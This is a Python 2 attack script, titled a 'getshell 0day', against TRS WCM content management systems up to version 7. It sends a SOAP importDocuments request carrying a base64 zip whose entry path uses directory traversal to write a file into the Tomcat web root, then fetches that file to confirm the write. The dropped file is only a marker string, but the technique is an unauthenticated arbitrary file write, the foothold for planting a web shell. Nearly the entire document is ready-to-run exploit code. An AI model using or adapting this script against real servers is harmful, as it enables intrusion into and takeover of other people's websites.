#!encoding=utf-8
#
# Plugin Name:TRS wcm <=7 getshell 0day
# Author	 :CF_HB
# Date		 :2016/3/20
#http://www.wooyun.org/bugs/wooyun-2015-0162315

import sys
import requests as req
def CheckVulns(url):
    headers = {'content-type': 'application/json','SOAPAction':'""'}
    if "http" not in url:
        print "usage: python %s http://test.com" % sys.argv[0]
    else:
        SEND_URL = url+"/wcm/services/trswcm:SOAPService"
        key_url = url+"/wcm/A37D5BB7D3A6EFD298678084E770D3BF.txt"
        key_hash = "This_site_is_vulnerable!"
        post_data = '<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.service.trs.com"><soapenv:Header/><soapenv:Body><impl:importDocuments><in0>UEsDBAoAAAAAADO+cUgnPmdlGAAAABgAAABGAAAALi4vLi4vLi4vLi4vLi4vVG9tY2F0L3dlYmFwcHMvd2NtL0EzN0Q1QkI3RDNBNkVGRDI5ODY3ODA4NEU3NzBEM0JGLnR4dFRoaXNfc2l0ZV9pc192dWxuZXJhYmxlIVBLAQI/AAoAAAAAADO+cUgnPmdlGAAAABgAAABGACQAAAAAAAAAIAAAAAAAAAAuLi8uLi8uLi8uLi8uLi9Ub21jYXQvd2ViYXBwcy93Y20vQTM3RDVCQjdEM0E2RUZEMjk4Njc4MDg0RTc3MEQzQkYudHh0CgAgAAAAAAABABgABgFum2SA0QEi9oRyZIDRASL2hHJkgNEBUEsFBgAAAAABAAEAmAAAAHwAAAAAAA==</in0><in1>.zip</in1></impl:importDocuments></soapenv:Body></soapenv:Envelope>'
        #exploiting....
        req.post(SEND_URL, data=post_data,headers=headers)
        #checking.....
        resp2 = req.get(key_url)
        if resp2.status_code ==200:
            if key_hash in resp2.content:
                mesg = "%s is vulnerable" % sys.argv[1]
                showUrl="openUrl: "+key_url
                print "\n"
                print '.'*(len(mesg)+2)
                print "."+mesg+"."
                print "."+showUrl+"."
                print '.'*(len(mesg)+2)
            else:
                print "something wrong!"
        else:
            print "%s is not vulnerable" % sys.argv[0]
if __name__ == '__main__':
    if len(sys.argv)!=2:
        print "usage: python %s url " % sys.argv[0]
    else:
        CheckVulns(sys.argv[1])
